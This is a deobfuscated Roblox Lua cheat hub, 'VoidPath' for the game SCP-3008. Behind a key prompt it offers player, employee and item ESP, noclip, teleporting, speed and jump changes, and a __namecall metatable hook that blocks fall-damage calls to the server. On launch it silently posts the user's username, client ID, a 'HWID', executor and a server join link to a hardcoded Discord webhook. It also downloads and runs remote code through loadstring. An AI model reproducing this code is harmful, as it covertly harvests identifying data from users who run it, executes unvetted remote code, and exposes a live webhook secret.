-- CN
-- 开源by：MR
-- http://qins.mc.hi.cn/MR-S
-- 功能效果没测试过,自行测试,如有损坏自行修复！
-- 全源开源，应该没有人闲的没事拿这个圈钱吧？
-- 最后：请标明来源，谢谢！

-- EN
-- Open Source by: MR
-- http://qins.mc.hi.cn/MR-S
-- Functionality hasn't been tested; test it yourself and fix any issues if damaged!
-- Fully open-source; hopefully no one would bother monetizing this, right?
-- Lastly: Please credit the source, thank you!


local vu1 = 'voidpath_key.txt'
local v2 = game:GetService('HttpService')
local vu3 = game:HttpGet('https://billowing-wave-838f.voidpathhub.workers.dev/')
local vu4 = v2:JSONDecode(vu3)

local function vu182()
    local v5 = game:GetService('HttpService')
    local v6 = game:GetService('Players').LocalPlayer
    local v7 = v6.DisplayName
    local _ = v6.Character
    local v8 = v6.UserId .. '-' .. v6.AccountAge
    local v9 = [[https://discord.com/api/webhooks/1405897752440864850/E-F9D89eugChHMW0VA1b5EciB50mzm65SFBJbBHTiO-TKSvheJ2NwQ6y1S9GpLZdCTvD]]
    local v10, v11 = identifyexecutor()
    local v12 = os.time() - v6.AccountAge * 86400
    local v13 = os.date('!*t', v12)
    local v14 = {
        username = 'SCP - 3008 Execution Logs',
        avatar_url = [[https://cdn.discordapp.com/attachments/1405888287222267975/1405897113468145664/bbmkV2u.png?ex=68a07f38&is=689f2db8&hm=62331a878029b00d0d0c4c9cf430a3525a3fdfcc62ba58376263a3add9a23909&]],
    }
    local v15 = {}
    local v16 = {
        color = 3093151,
        title = 'Execution Log',
        thumbnail = {
            url = v5:JSONDecode((game:HttpGet(string.format([[https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true]], v6.UserId)))).data[1].imageUrl,
        },
    }
    local v17 = {}
    local v18 = {
        name = 'Username',
        value = v6.Name,
        inline = true,
    }
    local v19 = {
        name = 'Join User',
        value = [[```game:GetService("TeleportService"):TeleportToPlaceInstance(]] .. game.PlaceId .. ',"' .. game.JobId .. '")```',
        inline = false,
    }
    local v20 = {
        name = 'Client ID',
        value = game:GetService('RbxAnalyticsService'):GetClientId(),
        inline = false,
    }

    __set_list(v17, 1, {
        v18,
        {
            name = 'Display Name',
            value = v7,
            inline = true,
        },
        v19,
        {
            name = 'HWID',
            value = v8,
            inline = false,
        },
        v20,
        {
            name = 'Executor',
            value = v10 .. ' ' .. v11,
            inline = true,
        },
        {
            name = 'Account Age',
            value = v6.AccountAge .. ' day(s)',
            inline = true,
        },
        {
            name = 'Date Joined',
            value = v13.month .. '/' .. v13.day .. '/' .. v13.year,
            inline = true,
        },
    })

    v16.fields = v17
    v16.timestamp = DateTime.now():ToIsoDate()

    __set_list(v15, 1, {
        v16
    })

    v14.embeds = v15

    local v21 = request or http_request

    if v21 then
        v21({
            Url = v9,
            Method = 'POST',
            Headers = {
                ['Content-Type'] = 'application/json',
            },
            Body = v5:JSONEncode(v14),
        })
    end

    local vu22 = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
    local vu23 = loadstring(game:HttpGet([[https://raw.githubusercontent.com/GhostDuckyy/ESP-Library/main/Kiriot22/source.lua]]))()

    vu23.Name = true
    vu23.TeamColor = false
    vu23.Tracers = false
    vu23.Boxes = false

    local v24 = game:GetService('Players')

    game:GetService('RunService')
    game:GetService('UserInputService')

    local vu25 = game:GetService('Lighting')
    local _ = workspace.CurrentCamera
    local _ = v24.LocalPlayer
    local v26 = vu22
    local v27 = {
        Name = 'VoidPath | 3008 [2.73]',
        Icon = 0,
        LoadingTitle = 'VoidPath | 3008 [2.73]',
        LoadingSubtitle = 'by Ryan',
        ShowText = 'VoidPath',
        Theme = {
            TextColor = Color3.fromRGB(255, 255, 255),
            Background = Color3.fromRGB(10, 10, 10),
            Topbar = Color3.fromRGB(15, 15, 15),
            Shadow = Color3.fromRGB(5, 5, 5),
            NotificationBackground = Color3.fromRGB(20, 20, 20),
            NotificationActionsBackground = Color3.fromRGB(240, 240, 240),
            TabBackground = Color3.fromRGB(25, 25, 25),
            TabStroke = Color3.fromRGB(40, 40, 40),
            TabBackgroundSelected = Color3.fromRGB(255, 255, 255),
            TabTextColor = Color3.fromRGB(255, 255, 255),
            SelectedTabTextColor = Color3.fromRGB(0, 0, 0),
            ElementBackground = Color3.fromRGB(20, 20, 20),
            ElementBackgroundHover = Color3.fromRGB(30, 30, 30),
            SecondaryElementBackground = Color3.fromRGB(15, 15, 15),
            ElementStroke = Color3.fromRGB(50, 50, 50),
            SecondaryElementStroke = Color3.fromRGB(40, 40, 40),
            SliderBackground = Color3.fromRGB(200, 200, 200),
            SliderProgress = Color3.fromRGB(0, 0, 0),
            SliderStroke = Color3.fromRGB(255, 255, 255),
            ToggleBackground = Color3.fromRGB(20, 20, 20),
            ToggleEnabled = Color3.fromRGB(255, 255, 255),
            ToggleDisabled = Color3.fromRGB(80, 80, 80),
            ToggleEnabledStroke = Color3.fromRGB(255, 255, 255),
            ToggleDisabledStroke = Color3.fromRGB(120, 120, 120),
            ToggleEnabledOuterStroke = Color3.fromRGB(200, 200, 200),
            ToggleDisabledOuterStroke = Color3.fromRGB(60, 60, 60),
            DropdownSelected = Color3.fromRGB(30, 30, 30),
            DropdownUnselected = Color3.fromRGB(20, 20, 20),
            InputBackground = Color3.fromRGB(15, 15, 15),
            InputStroke = Color3.fromRGB(80, 80, 80),
            PlaceholderColor = Color3.fromRGB(180, 180, 180),
        },
        ToggleUIKeybind = 'K',
        DisableRayfieldPrompts = false,
        DisableBuildWarnings = false,
        ConfigurationSaving = {
            Enabled = true,
            FolderName = 'VoidPath',
            FileName = 'VoidPathKeySystem',
        },
    }
    local v28 = vu22.CreateWindow(v26, v27)
    local v29 = v28:CreateTab('Introduction', 'info')

    v29:CreateLabel('Welcome to VoidPath 3008 [2.73] Hub!')
    v29:CreateLabel('Version 1.0 | Author: Ryan')
    v29:CreateButton({
        Name = 'Copy Discord Invite',
        Callback = function()
            setclipboard('https://discord.gg/ssnKXk7J8G')
            vu22:Notify({
                Title = 'Copied to Clipboard',
                Content = 'Discord invite link copied!',
                Duration = 5,
                Image = 4483362458,
            })
        end,
    })

    local v30 = vu22

    vu22.Notify(v30, {
        Title = 'Welcome to VoidPath',
        Content = "You're now running the 3008 [2.73] Hub.",
        Duration = 6.5,
        Image = 4483362458,
    })

    local v31 = v28:CreateTab('ESP', 'eye')
    local v32 = v28:CreateTab('Character', 'user')
    local v33 = v28:CreateTab('Misc', 'settings')

    v31:CreateSection('ESP')
    v31:CreateToggle({
        Name = 'Player ESP',
        CurrentValue = false,
        Flag = 'ESP',
        Callback = function(p34)
            vu23:Toggle(p34)
        end,
    })
    v31:CreateToggle({
        Name = 'Player ESP Boxes',
        CurrentValue = false,
        Flag = 'ESPBoxes',
        Callback = function(p35)
            vu23.Boxes = p35
        end,
    })

    local v36 = game:GetService('Players')
    local v37 = game:GetService('RunService')
    local vu38 = v36.LocalPlayer
    local _ = workspace.CurrentCamera
    local vu39 = 700
    local vu40 = false
    local vu41 = workspace:WaitForChild('GameObjects'):WaitForChild('Physical'):WaitForChild('Employees')

    local function vu45(p42)
        local v43 = Instance.new('BillboardGui')

        v43.Name = 'EmployeeESP'
        v43.AlwaysOnTop = true
        v43.Size = UDim2.new(0, 100, 0, 40)
        v43.StudsOffset = Vector3.new(0, 3, 0)
        v43.Adornee = p42
        v43.Parent = p42

        local v44 = Instance.new('TextLabel')

        v44.Size = UDim2.new(1, 0, 1, 0)
        v44.BackgroundTransparency = 1
        v44.TextColor3 = Color3.new(1, 1, 1)
        v44.TextStrokeTransparency = 0.5
        v44.Font = Enum.Font.SourceSansBold
        v44.TextScaled = true
        v44.Text = '...'
        v44.Parent = v43
    end
    local function vu48(p46)
        if not p46:FindFirstChild('EmployeeHighlight') then
            local v47 = Instance.new('Highlight')

            v47.Name = 'EmployeeHighlight'
            v47.FillColor = Color3.fromRGB(255, 255, 0)
            v47.OutlineColor = Color3.new(1, 1, 1)
            v47.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
            v47.Adornee = p46
            v47.Parent = p46
        end
    end
    local function vu55()
        local v49 = vu41
        local v50, v51, v52 = pairs(v49:GetChildren())

        while true do
            local v53

            v52, v53 = v50(v51, v52)

            if v52 == nil then
                break
            end
            if v53:IsA('Model') and v53.Name:lower():find('employee') then
                local v54 = v53:FindFirstChild('HumanoidRootPart')

                if v54 and v54:FindFirstChild('EmployeeESP') then
                    v54.EmployeeESP:Destroy()
                end
                if v53:FindFirstChild('EmployeeHighlight') then
                    v53.EmployeeHighlight:Destroy()
                end
            end
        end
    end

    v37.RenderStepped:Connect(function()
        if vu40 then
            local v56 = vu41
            local v57, v58, v59 = pairs(v56:GetChildren())

            while true do
                local v60

                v59, v60 = v57(v58, v59)

                if v59 == nil then
                    break
                end
                if v60:IsA('Model') and v60.Name:lower():find('employee') then
                    local v61 = v60:FindFirstChild('HumanoidRootPart')
                    local v62 = vu38.Character

                    if v62 then
                        v62 = vu38.Character:FindFirstChild('HumanoidRootPart')
                    end
                    if v61 and v62 then
                        local v63 = (v62.Position - v61.Position).Magnitude

                        if v63 > vu39 then
                            if v61:FindFirstChild('EmployeeESP') then
                                v61.EmployeeESP:Destroy()
                            end
                            if v60:FindFirstChild('EmployeeHighlight') then
                                v60.EmployeeHighlight:Destroy()
                            end
                        else
                            if not v61:FindFirstChild('EmployeeESP') then
                                vu45(v61)
                            end

                            vu48(v60)

                            local v64 = v61:FindFirstChild('EmployeeESP')

                            if v64 then
                                local v65 = v64:FindFirstChildOfClass('TextLabel')

                                if v65 then
                                    v65.Text = string.format('%s\n%.0f studs', v60.Name, v63)
                                end
                            end
                        end
                    end
                end
            end
        else
            vu55()
        end
    end)
    v31:CreateToggle({
        Name = 'Employee ESP',
        CurrentValue = false,
        Flag = 'EmployeeESP',
        Callback = function(p66)
            vu40 = p66
        end,
    })

    local v67 = game:GetService('Players')
    local vu68 = game:GetService('RunService')
    local vu69 = v67.LocalPlayer
    local _ = workspace.CurrentCamera
    local vu70 = 400
    local vu71 = false
    local vu72 = workspace:WaitForChild('GameObjects'):WaitForChild('Physical'):WaitForChild('Items')

    local function vu77(p73, p74)
        local v75 = Instance.new('BillboardGui')

        v75.Name = 'ItemESP'
        v75.AlwaysOnTop = true
        v75.Size = UDim2.new(0, 100, 0, 40)
        v75.StudsOffset = Vector3.new(0, 3, 0)
        v75.Adornee = p73
        v75.Parent = p73

        local v76 = Instance.new('TextLabel')

        v76.Size = UDim2.new(1, 0, 1, 0)
        v76.BackgroundTransparency = 1
        v76.TextColor3 = Color3.new(1, 1, 1)
        v76.TextStrokeTransparency = 0.5
        v76.Font = Enum.Font.SourceSansBold
        v76.TextScaled = true
        v76.Text = p74
        v76.Parent = v75
    end
    local function vu84()
        local v78 = vu72
        local v79, v80, v81 = ipairs(v78:GetChildren())

        while true do
            local v82

            v81, v82 = v79(v80, v81)

            if v81 == nil then
                break
            end
            if v82:IsA('Model') and v82.PrimaryPart then
                local v83 = v82.PrimaryPart:FindFirstChild('ItemESP')

                if v83 then
                    v83:Destroy()
                end
            end
        end
    end

    vu68.RenderStepped:Connect(function()
        if vu71 then
            local v85 = vu69.Character

            if v85 then
                v85 = vu69.Character:FindFirstChild('HumanoidRootPart')
            end
            if v85 then
                local v86 = vu72
                local v87, v88, v89 = ipairs(v86:GetChildren())

                while true do
                    local v90

                    v89, v90 = v87(v88, v89)

                    if v89 == nil then
                        break
                    end
                    if v90:IsA('Model') and v90.PrimaryPart then
                        local v91 = (v90.PrimaryPart.Position - v85.Position).Magnitude

                        if v91 > vu70 then
                            local v92 = v90.PrimaryPart:FindFirstChild('ItemESP')

                            if v92 then
                                v92:Destroy()
                            end
                        elseif v90.PrimaryPart:FindFirstChild('ItemESP') then
                            local v93 = v90.PrimaryPart.ItemESP:FindFirstChildOfClass('TextLabel')

                            if v93 then
                                v93.Text = string.format('%s\n%.0f studs', v90.Name, v91)
                            end
                        else
                            vu77(v90.PrimaryPart, string.format('%s\n%.0f studs', v90.Name, v91))
                        end
                    end
                end
            end
        else
            vu84()

            return
        end
    end)
    v31:CreateToggle({
        Name = 'Item ESP',
        CurrentValue = false,
        Flag = 'ItemESP',
        Callback = function(p94)
            vu71 = p94
        end,
    })

    local vu95 = false
    local vu96 = nil

    local function vu103()
        if vu96 then
            vu96:Disconnect()
        end

        local vu97 = vu69.Character

        if vu97 then
            vu96 = vu68.Stepped:Connect(function()
                if vu95 then
                    local v98 = vu97
                    local v99, v100, v101 = ipairs(v98:GetDescendants())

                    while true do
                        local v102

                        v101, v102 = v99(v100, v101)

                        if v101 == nil then
                            break
                        end
                        if v102:IsA('BasePart') then
                            v102.CanCollide = false
                        end
                    end
                end
            end)
        end
    end

    v32:CreateToggle({
        Name = 'Noclip',
        CurrentValue = false,
        Flag = 'Noclip',
        Callback = function(p104)
            vu95 = p104

            if p104 then
                vu103()
            else
                if vu96 then
                    vu96:Disconnect()
                end

                local v105 = vu69.Character

                if v105 then
                    local v106, v107, v108 = ipairs(v105:GetDescendants())

                    while true do
                        local v109

                        v108, v109 = v106(v107, v108)

                        if v108 == nil then
                            break
                        end
                        if v109:IsA('BasePart') then
                            v109.CanCollide = true
                        end
                    end
                end
            end
        end,
    })
    vu69.CharacterAdded:Connect(function()
        if vu95 then
            wait(0.25)
            vu103()
        end
    end)

    local vu110 = {
        Brightness = vu25.Brightness,
        ClockTime = vu25.ClockTime,
        FogEnd = vu25.FogEnd,
        Ambient = vu25.Ambient,
        OutdoorAmbient = vu25.OutdoorAmbient,
    }
    local vu111 = nil

    v33:CreateToggle({
        Name = 'Fullbright',
        CurrentValue = false,
        Flag = 'Fullbright',
        Callback = function(p112)
            if p112 then
                vu111 = vu68.RenderStepped:Connect(function()
                    vu25.Brightness = 2
                    vu25.ClockTime = 12
                    vu25.FogEnd = 10000000000
                    vu25.Ambient = Color3.new(1, 1, 1)
                    vu25.OutdoorAmbient = Color3.new(1, 1, 1)
                end)
            else
                if vu111 then
                    vu111:Disconnect()
                end

                local v113, v114, v115 = pairs(vu110)

                while true do
                    local v116

                    v115, v116 = v113(v114, v115)

                    if v115 == nil then
                        break
                    end

                    vu25[v115] = v116
                end
            end
        end,
    })

    local v117 = game:GetService('Players')
    local vu118 = game:GetService('RunService')
    local vu119 = v117.LocalPlayer
    local vu120 = nil
    local vu121 = nil

    v33:CreateToggle({
        Name = 'VoidPath Coordinate Display',
        CurrentValue = false,
        Flag = 'CoordDisplay',
        Callback = function(p122)
            if p122 then
                local v123 = Instance.new('ScreenGui')

                v123.Name = 'CoordinateDisplay'
                v123.ResetOnSpawn = false
                v123.Parent = vu119:WaitForChild('PlayerGui')

                local vu124 = Instance.new('TextLabel')

                vu124.Size = UDim2.new(0, 300, 0, 30)
                vu124.Position = UDim2.new(0, 10, 0.85, 0)
                vu124.BackgroundTransparency = 1
                vu124.TextColor3 = Color3.fromRGB(255, 255, 255)
                vu124.TextStrokeTransparency = 0.5
                vu124.Font = Enum.Font.SourceSansBold
                vu124.TextSize = 20
                vu124.Text = 'Coordinates: N/A'
                vu124.Parent = v123
                vu120 = v123
                vu121 = vu118.RenderStepped:Connect(function()
                    local v125 = vu119.Character

                    if v125 and v125:FindFirstChild('HumanoidRootPart') then
                        local v126 = v125.HumanoidRootPart.Position

                        vu124.Text = string.format('Coordinates: X=%.1f, Y=%.1f, Z=%.1f', v126.X, v126.Y, v126.Z)
                    end
                end)
            else
                if vu120 then
                    vu120:Destroy()

                    vu120 = nil
                end
                if vu121 then
                    vu121:Disconnect()

                    vu121 = nil
                end
            end
        end,
    })

    local vu127 = game:GetService('Players').LocalPlayer
    local vu128 = workspace:WaitForChild('GameObjects'):WaitForChild('Physical'):WaitForChild('Items')
    local vu129 = {
        '2 Litre Dr. Bob',
        'Apple',
        'Banana',
        'Bloxy Soda',
        'Beans',
        'Burger',
        'Chips',
        'Cookie',
        'Dr. Bob Soda',
        'Hotdog',
        'Ice Cream',
        'Lemon',
        'Lemon Slice',
        'Meatballs',
        'Medkit',
        'Pizza',
        'Scrubber Duds',
        'Striped Donut',
        'Water',
    }
    local vu130 = vu129[1]

    local function vu143(p131)
        local v132 = vu127.Character

        if not v132 then
            return nil
        end

        local v133 = v132:FindFirstChild('HumanoidRootPart')

        if not v133 then
            return nil
        end

        local v134 = math.huge
        local v135 = vu128
        local v136, v137, v138 = pairs(v135:GetChildren())
        local v139 = nil

        while true do
            local v140

            v138, v140 = v136(v137, v138)

            if v138 == nil then
                break
            end
            if v140:IsA('Model') and v140.Name == p131 then
                local v141 = v140.PrimaryPart and v140.PrimaryPart.CFrame or v140:GetPivot()
                local v142 = (v133.Position - v141.Position).Magnitude

                if v142 < v134 then
                    v139 = v140
                    v134 = v142
                end
            end
        end

        return v139
    end

    v33:CreateDropdown({
        Name = 'Select Food Item',
        Options = vu129,
        Default = vu130,
        Callback = function(p144)
            if typeof(p144) ~= 'table' then
                vu130 = p144
            else
                vu130 = p144[1] or vu129[1]
            end

            print('Selected item:', vu130)
        end,
    })
    v33:CreateButton({
        Name = 'Teleport to Closest Selected Item',
        Callback = function()
            local v145 = vu143(vu130)

            if v145 then
                local v146 = vu127.Character

                if v146 then
                    v146 = v146:FindFirstChild('HumanoidRootPart')
                end
                if v146 then
                    v146.CFrame = (v145.PrimaryPart and v145.PrimaryPart.CFrame or v145:GetPivot()) + Vector3.new(0, 3, 0)

                    vu22:Notify({
                        Title = 'Teleported',
                        Content = 'Teleported to ' .. v145.Name,
                        Duration = 3,
                    })
                end
            else
                vu22:Notify({
                    Title = 'Item Not Found',
                    Content = 'No nearby item named: ' .. vu130,
                    Duration = 3,
                })
            end
        end,
    })
    v33:CreateButton({
        Name = 'Rejoin Server',
        Callback = function()
            local vu147 = game:GetService('TeleportService')
            local vu148 = game:GetService('Players');
            (function()
                local v149 = vu148.LocalPlayer

                if v149 then
                    vu147:Teleport(game.PlaceId, v149)
                end
            end)()
        end,
    })
    v33:CreateButton({
        Name = 'Server Hop',
        Callback = function()
            local vu150 = game:GetService('HttpService')
            local v151 = game:GetService('TeleportService')
            local v152 = game:GetService('Players')
            local v153 = game.PlaceId
            local v154 = game.JobId
            local vu155 = 'https://games.roblox.com/v1/games/' .. v153 .. '/servers/Public?sortOrder=Asc&limit=100'
            local v156, v157 = pcall(function()
                return vu150:JSONDecode(game:HttpGet(vu155))
            end)

            if v156 and (v157 and v157.data) then
                local v158, v159, v160 = pairs(v157.data)

                while true do
                    local v161

                    v160, v161 = v158(v159, v160)

                    if v160 == nil then
                        break
                    end
                    if v161.id ~= v154 and v161.playing < v161.maxPlayers then
                        v151:TeleportToPlaceInstance(v153, v161.id, v152.LocalPlayer)

                        break
                    end
                end
            end
        end,
    })

    local v162 = game:GetService('Players')
    local vu163 = game:GetService('RunService')
    local vu164 = v162.LocalPlayer
    local vu165 = false

    v32:CreateToggle({
        Name = 'Unlock Third Person',
        CurrentValue = false,
        Flag = 'ThirdPersonToggle',
        Callback = function(p166)
            if p166 then
                vu165 = vu163.RenderStepped:Connect(function()
                    vu164.CameraMode = Enum.CameraMode.Classic
                    vu164.CameraMinZoomDistance = 5
                    vu164.CameraMaxZoomDistance = 20
                end)
            else
                if vu165 then
                    vu165:Disconnect()

                    vu165 = nil
                end

                vu164.CameraMode = Enum.CameraMode.LockFirstPerson
                vu164.CameraMinZoomDistance = 0.5
                vu164.CameraMaxZoomDistance = 0.5
            end
        end,
    })

    local vu167 = false
    local v168 = getrawmetatable(game)

    setreadonly(v168, false)

    local vu169 = v168.__namecall

    v168.__namecall = newcclosure(function(p170, ...)
        if getnamecallmethod() == 'FireServer' and (select(1, ...) == 'FallDamage' and vu167) then
            local v171 = vu164.Character

            if v171 and v171.Parent then
                return nil
            end
        end

        return vu169(p170, ...)
    end)

    v32:CreateToggle({
        Name = 'No Fall Damage',
        CurrentValue = false,
        Flag = 'NoFallDamageToggle',
        Callback = function(p172)
            vu167 = p172
        end,
    })

    local vu173 = game:GetService('UserInputService')
    local vu174 = game:GetService('Players')
    local vu175 = false
    local vu176 = nil

    v32:CreateToggle({
        Name = 'Infinite Jump',
        CurrentValue = false,
        Flag = 'InfiniteJump',
        Callback = function(p177)
            vu175 = p177

            if vu176 then
                vu176:Disconnect()

                vu176 = nil
            end
            if vu175 then
                vu176 = vu173.JumpRequest:Connect(function()
                    local v178 = vu174.LocalPlayer
                    local v179 = (v178.Character or v178.CharacterAdded:Wait()):FindFirstChildOfClass('Humanoid')

                    if v179 and v179:GetState() ~= Enum.HumanoidStateType.Dead then
                        v179:ChangeState(Enum.HumanoidStateType.Jumping)
                    end
                end)
            end
        end,
    })
    v32:CreateSlider({
        Name = 'Walk Speed',
        Range = {
            0,
            100
        },
        Increment = 5,
        Suffix = 'Value',
        CurrentValue = 16,
        Flag = 'Slider1',
        Callback = function(p180)
            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = p180
        end,
    })
    v32:CreateSlider({
        Name = 'Jump Height',
        Range = {
            15,
            150
        },
        Increment = 5,
        Suffix = 'Value',
        CurrentValue = 15,
        Flag = 'Slider1',
        Callback = function(p181)
            game.Players.LocalPlayer.Character.Humanoid.JumpPower = p181
        end,
    })
end
local function vu185()
    local v183, v184 = pcall(function()
        return vu3
    end)

    return v183 and v184 and (vu4.key and {
        vu4.key,
    } or {}) or {}
end

if isfile and isfile(vu1) then
    local v186 = readfile(vu1)
    local v187 = vu185()

    if table.find(v187, v186) then
        vu182()

        return
    end

    pcall(delfile, vu1)
end

local vu188 = Instance.new('ScreenGui')

vu188.Name = 'VoidPathKeyUI'
vu188.ResetOnSpawn = false
vu188.IgnoreGuiInset = true
vu188.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
vu188.Parent = game:GetService('CoreGui')

local v189 = Instance.new('Frame', vu188)

v189.Size = UDim2.new(0, 420, 0, 220)
v189.Position = UDim2.new(0.5, - 210, 0.5, - 110)
v189.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
v189.BorderSizePixel = 0
v189.ZIndex = 2
Instance.new('UICorner', v189).CornerRadius = UDim.new(0, 12)

local v190 = Instance.new('TextLabel', v189)

v190.Size = UDim2.new(1, 0, 0, 40)
v190.Position = UDim2.new(0, 0, 0, 0)
v190.BackgroundTransparency = 1
v190.Text = 'VoidPath Key System'
v190.Font = Enum.Font.GothamBold
v190.TextSize = 22
v190.TextColor3 = Color3.fromRGB(242, 243, 243)
v190.ZIndex = 3

local vu191 = Instance.new('TextBox', v189)

vu191.Text = 'Enter your key...'
vu191.PlaceholderText = 'Enter your key...'
vu191.Size = UDim2.new(0.9, 0, 0, 40)
vu191.Position = UDim2.new(0.05, 0, 0.3, 0)
vu191.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
vu191.TextColor3 = Color3.new(1, 1, 1)
vu191.TextSize = 18
vu191.Font = Enum.Font.Gotham
vu191.BorderSizePixel = 0
vu191.ZIndex = 3
Instance.new('UICorner', vu191).CornerRadius = UDim.new(0, 8)

local vu192 = Instance.new('TextLabel', v189)

vu192.Size = UDim2.new(1, 0, 0, 24)
vu192.Position = UDim2.new(0, 0, 0.55, 0)
vu192.BackgroundTransparency = 1
vu192.Font = Enum.Font.Gotham
vu192.TextSize = 16
vu192.Text = ''
vu192.TextColor3 = Color3.fromRGB(255, 100, 100)
vu192.ZIndex = 3

local v193 = Instance.new('TextButton', v189)

v193.Size = UDim2.new(0.425, 0, 0, 38)
v193.Position = UDim2.new(0.05, 0, 0.72, 0)
v193.Text = 'Submit'
v193.Font = Enum.Font.GothamSemibold
v193.TextSize = 18
v193.TextColor3 = Color3.new(3, 3, 3)
v193.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
v193.BorderSizePixel = 0
v193.ZIndex = 3
Instance.new('UICorner', v193).CornerRadius = UDim.new(0, 8)

local v194 = Instance.new('TextButton', v189)

v194.Size = UDim2.new(0.425, 0, 0, 38)
v194.Position = UDim2.new(0.525, 0, 0.72, 0)
v194.Text = 'Get Key'
v194.Font = Enum.Font.GothamSemibold
v194.TextSize = 18
v194.TextColor3 = Color3.new(1, 1, 1)
v194.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
v194.BorderSizePixel = 0
v194.ZIndex = 3
Instance.new('UICorner', v194).CornerRadius = UDim.new(0, 8)

v193.MouseButton1Click:Connect(function()
    local v195 = vu191.Text:upper()
    local v196 = vu185()

    if table.find(v196, v195) then
        vu192.TextColor3 = Color3.fromRGB(100, 255, 120)
        vu192.Text = 'Valid key! Loading...'

        if writefile then
            writefile(vu1, v195)
        end

        wait(1)
        vu188:Destroy()
        vu182()
    else
        vu192.TextColor3 = Color3.fromRGB(255, 80, 80)
        vu192.Text = 'Invalid key. Try again.'

        pcall(delfile, vu1)
    end
end)
v194.MouseButton1Click:Connect(function()
    setclipboard('https://www.voidpath.pro/')

    vu192.TextColor3 = Color3.fromRGB(242, 243, 243)
    vu192.Text = 'Link copied to clipboard!'
end)